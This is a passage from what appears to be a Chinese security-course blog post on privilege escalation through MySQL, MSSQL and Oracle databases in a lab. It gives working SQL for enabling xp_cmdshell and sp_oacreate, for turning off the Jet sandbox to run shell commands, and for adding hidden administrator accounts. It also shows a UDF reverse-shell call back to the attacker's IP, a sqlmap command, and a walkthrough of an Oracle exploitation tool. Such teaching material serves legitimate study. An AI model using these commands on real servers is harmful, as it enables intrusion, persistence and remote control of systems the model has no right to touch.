+<p>&lt;2&gt;用上面那个工具，点击 创建反弹函数，点击 执行。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-28.png" alt="60-28"></p>
+<p>&lt;3&gt;输入自定义SQL语句：select backshell(‘你的IP’,5577)，点击 执行。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-29.png" alt="60-29"></p>
+<p>&lt;4&gt;反弹成功。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-30.png" alt="60-30"></p>
+<p>&lt;5&gt;可以执行命令试一下</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-31.png" alt="60-31"></p>
+<p><strong>案例2：Mssql数据库提权演示-连接客户端</strong></p>
+<p>环境准备：windows2008、SqlServer2008</p>
+<p>流程：服务探针-信息收集-提权利用-获取权限</p>
+<p>1、使用xp_cmdshell进行提权</p>
+<p>&lt;1&gt;通过查看服务器配置文件得到sa账户密码为admin。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-32.png" alt="60-32"></p>
+<p>&lt;2&gt;由于mssql默认支持外联，因为可以本地通过SqlServer2008客户端使用sa账户密码连接。Navicat也能连接，但是推荐用官方的。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-33.png" alt="60-33"></p>
+<p>&lt;3&gt;启用xp_cmdshell。xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"> </span><br><span class="line">关闭；</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1 ；</span><br><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;,0;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-34.png" alt="60-34"></p>
+<p>&lt;4&gt;接下来，我们就可以执行任意命令了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行：</span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-35.png" alt="60-35"></p>
+<p>&lt;5&gt;如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exex master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;,&#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>xp_cmdshell在数据库-系统数据库-master-可编程性-扩展存储过程-系统扩展存储过程目录下。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-36.png" alt="60-36"></p>
+<p>2、使用sp_oacreate进行提权</p>
+<p>主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令。</p>
+<p>&lt;1&gt;启用sp_oacreate</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;,1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"> </span><br><span class="line">关闭：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;,0;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-37.png" alt="60-37"></p>
+<p>&lt;2&gt;执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">执行whoami查看权限：</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;C:\\1.txt&#x27;</span><br><span class="line"> </span><br><span class="line">添加用户：</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net user 123$ 123/add&#x27;</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net localgroup administrators 123$ /add&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-38.png" alt="60-38"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-39.png" alt="60-39"></p>
+<p>3、使用SqlServer沙盒提权</p>
+<p>依次执行下列sql语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">--提权语句</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line"> </span><br><span class="line">-- 不开启的话在执行xp_regwrite会提示让我们开启</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br><span class="line"> </span><br><span class="line">--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br><span class="line"> </span><br><span class="line">--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span><br><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;, &#x27;SandBoxMode&#x27;</span><br><span class="line"> </span><br><span class="line">--执行系统命令</span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;)</span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net localgroup administrators margin /add&quot;)&#x27;)</span><br><span class="line"> </span><br><span class="line">沙盒模式SandBoxMode参数含义（默认是2）</span><br><span class="line">`0`：在任何所有者中禁止启用安全模式</span><br><span class="line">`1`：为仅在允许范围内</span><br><span class="line">`2`：必须在access模式下</span><br><span class="line">`3`：完全开启</span><br><span class="line">openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。</span><br><span class="line"> </span><br><span class="line">--恢复配置（暂不执行）</span><br><span class="line">--exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1;</span><br><span class="line">--exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,0;reconfigure;</span><br><span class="line">--exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;</span><br></pre></td></tr></table></figure>
+
+<p>成功创建用户。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-40.png" alt="60-40"></p>
+<p>参考资料：https:blog.51cto.com&#x2F;11797152&#x2F;2411770</p>
+<p><strong>案例3：Oracle数据库提权演示-自动化工具</strong></p>
+<p>1、普通用户模式：</p>
+<p>前提是拥有一个普通的Oracle连接账号。不需要DBA权限，可提权至DBA，并以Oracle实例运行的权限执行操作系统命令。</p>
+<p>2、DBA用户模式：（自动化工具演示）</p>
+<p>拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。</p>
+<p>案例演示</p>
+<p>&lt;1&gt;首先读取配置文件，获取到一个Oracle账号密码。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-41.png" alt="60-41"></p>
+<p>&lt;2&gt;工具连接。若账号是普通账号，选择普通模式，若账号是DBA账号，选择DBA模式。然后输入数据库相关信息，点击连接。提示payload发送成功。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-42.png" alt="60-42"></p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-43.png" alt="60-43"></p>
+<p>&lt;3&gt;提权成功，接下来可以任意执行命令了。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-44.png" alt="60-44"></p>
+<p>也可以点击文件管理，操作文件。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-45.png" alt="60-45"></p>
+<p>还可以反弹shell。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-46.png" alt="60-46"></p>
+<p>&lt;4&gt;若没有账号密码，但是有注入点，还可以用这个工具的注入模式，进行注入提权。</p>
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-47.png" alt="60-47"></p>
+<p>3、注入提升模式：（sqlmap测试演示）</p>
+<p>拥有一个Oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证。</p>
+<p>说明：对于JSP网站，当前获取到它的网站权限后，不需要提权。因为它的网站权限就是系统权限，jsp自带system。因为一般Oracle数据库会和jsp搭配使用，所以当你拥有一个注入点时，你会发现，这个注入点本身就拥有system权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：sqlmap.py -u http://192.168.131.142:8080/sql.jsp?id-7698 --is-dba</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-48.png" alt="60-48"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://blog.hvvl404.fun/">HVVL404</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://blog.hvvl404.fun/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&amp;MS&amp;ORA%E7%AD%89SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/">http://blog.hvvl404.fun/2023/06/05/小迪安全/小迪安全（权限提升）/60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.hvvl404.fun" target="_blank">HVVL404</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&amp;SC&amp;PS%E6%8F%90%E6%9D%83/" title="59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权</div></div></a></div><div class="next-post pull-right"><a href="/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/58%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/" title="58：权限提升-网站权限后台漏洞第三方获取"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">58：权限提升-网站权限后台漏洞第三方获取</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">HVVL404</div><div class="author-info__description">欢迎来到我的博客</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/59%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&amp;SC&amp;PS%E6%8F%90%E6%9D%83/" title="59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权">59：权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权</a><time datetime="2023-06-05T14:47:18.052Z" title="发表于 2023-06-05 22:47:18">2023-06-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&amp;MS&amp;ORA%E7%AD%89SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" title="60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权">60：权限提升-MY&amp;MS&amp;ORA等SQL数据库提权</a><time datetime="2023-06-05T14:37:01.209Z" title="发表于 2023-06-05 22:37:01">2023-06-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/58%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/" title="58：权限提升-网站权限后台漏洞第三方获取">58：权限提升-网站权限后台漏洞第三方获取</a><time datetime="2023-06-05T14:27:20.000Z" title="发表于 2023-06-05 22:27:20">2023-06-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/26/Web%E6%BC%8F%E6%B4%9E/JWT%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%BC%8F%E6%B4%9E/" title="无题">无题</a><time datetime="2023-05-26T14:25:56.752Z" title="发表于 2023-05-26 22:25:56">2023-05-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/26/Web%E6%BC%8F%E6%B4%9E/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="无题">无题</a><time datetime="2023-05-26T14:16:40.565Z" title="发表于 2023-05-26 22:16:40">2023-05-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023.4.27 - 2023 By HVVL404</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="http://blog.hvvl404.fun">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
